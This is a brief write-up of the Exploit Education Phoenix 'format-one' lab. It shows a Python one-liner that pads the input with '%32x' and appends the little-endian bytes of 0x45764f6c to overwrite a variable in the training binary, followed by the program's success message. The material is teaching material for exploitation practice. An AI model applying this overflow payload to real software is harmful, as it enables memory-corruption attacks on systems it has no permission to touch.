# Format 1

Write-up for: [https://exploit.education/phoenix/format-one/](Format One)

<!--more-->

This is the exact same challenge as format-zero, but now we need to be precise.
Since we did this in the previous exercise already, we can come to the solution immediately.

We want to change the `changeme` variable to `0x45764f6c`

```
user@phoenix-amd64:/opt/phoenix/i486$ python -c 'print "%32x" + "\x45\x76\x4f\x6c"[::-1]' | ./format-one
Welcome to phoenix/format-one, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed correctly!
```

Remember the little-endianness aaand: done.
